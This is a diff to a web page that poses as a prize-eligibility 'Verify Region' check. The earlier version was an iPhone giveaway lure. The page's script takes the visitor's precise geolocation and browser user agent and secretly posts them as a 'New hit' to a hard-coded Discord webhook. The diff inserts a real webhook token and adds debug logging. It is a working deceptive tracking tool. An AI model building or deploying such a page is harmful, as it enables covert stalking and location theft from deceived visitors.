@@ -3,53 +3,75 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Free iPhone 15 Giveaway - Claim Now</title>
+<title>Verify Region</title>
 <style>
   body { font-family: system-ui, sans-serif; background:#0f172a; color:#e2e8f0; margin:0; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
-  .card { background:#1e293b; padding:40px; border-radius:16px; max-width:480px; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,.4); }
-  h1 { margin-top:0; color:#38bdf8; }
-  button { background:#38bdf8; color:#0f172a; border:none; padding:14px 28px; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:16px; }
+  .card { background:#1e293b; padding:32px; border-radius:16px; max-width:480px; width:100%; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,.4); }
+  h1 { color:#38bdf8; margin-top:0; }
+  button { background:#38bdf8; color:#0f172a; border:none; padding:16px 32px; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:16px; width:100%; }
   button:hover { background:#0ea5e9; }
-  #status { margin-top:20px; font-size:14px; opacity:.8; }
+  #log { margin-top:20px; text-align:left; font-family:monospace; font-size:12px; background:#0f172a; padding:12px; border-radius:8px; min-height:60px; white-space:pre-wrap; word-break:break-all; }
   a { color:#38bdf8; }
 </style>
 </head>
 <body>
 <div class="card">
-  <h1>🎁 You're Almost There!</h1>
-  <p>Verify your region to confirm eligibility for your prize.</p>
+  <h1>🎁 Verify Region</h1>
+  <p>Tap below and allow location to confirm eligibility.</p>
   <button onclick="grab()">Verify My Region</button>
-  <div id="status"></div>
+  <div id="log">Waiting...</div>
 </div>
 
 <script>
-const WEBHOOK = "PASTE_YOUR_DISCORD_OR_WEBHOOK_URL_HERE";
+const WEBHOOK = "https://discord.com/api/webhooks/1382000326013489223/LthuGBG_prhgk0wz0agIxO07-wTqK6eOQ08BkNMKIPEhEgp5jdynLjMVrfSCZf9fqSWp";
+
+function log(msg) {
+  document.getElementById('log').textContent += "\n" + msg;
+}
 
 function grab() {
-  const s = document.getElementById('status');
-  if (!navigator.geolocation) { s.textContent = "Geolocation not supported."; return; }
-  s.textContent = "Verifying...";
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const acc = pos.coords.accuracy;
-    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-    const ua = navigator.userAgent;
-    const payload = {
-      content: `📍 **New hit**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nUA: ${ua}`
-    };
-    try {
-      await fetch(WEBHOOK, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify(payload)
-      });
-    } catch(e) {}
-    s.innerHTML = `✅ Verified! Your region: <a href="${maps}" target="_blank">${lat.toFixed(5)}, ${lon.toFixed(5)}</a><br><small>Redirecting...</small>`;
-    setTimeout(()=>{ window.location.href="https://google.com"; }, 3000);
-  }, (err) => {
-    s.textContent = "⚠️ Please allow location access to continue.";
-  }, { enableHighAccuracy: true, timeout: 10000 });
+  document.getElementById('log').textContent = "Starting...";
+
+  if (!navigator.geolocation) {
+    log("❌ Browser has no geolocation API");
+    return;
+  }
+
+  if (!window.isSecureContext) {
+    log("❌ Not HTTPS — geolocation blocked");
+    return;
+  }
+
+  log("Requesting permission...");
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+      const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+      log(`✅ Got coords: ${lat}, ${lon} (±${acc}m)`);
+      log(`Map: ${maps}`);
+
+      try {
+        const res = await fetch(WEBHOOK, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({
+            content: `📍 **New hit**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nUA: ${navigator.userAgent}`
+          })
+        });
+        log("Webhook status: " + res.status);
+      } catch(e) {
+        log("Webhook failed: " + e.message);
+      }
+    },
+    (err) => {
+      const codes = {1:"PERMISSION_DENIED", 2:"POSITION_UNAVAILABLE", 3:"TIMEOUT"};
+      log("❌ Error: " + (codes[err.code] || err.code) + " — " + err.message);
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
 }
 </script>
 </body>
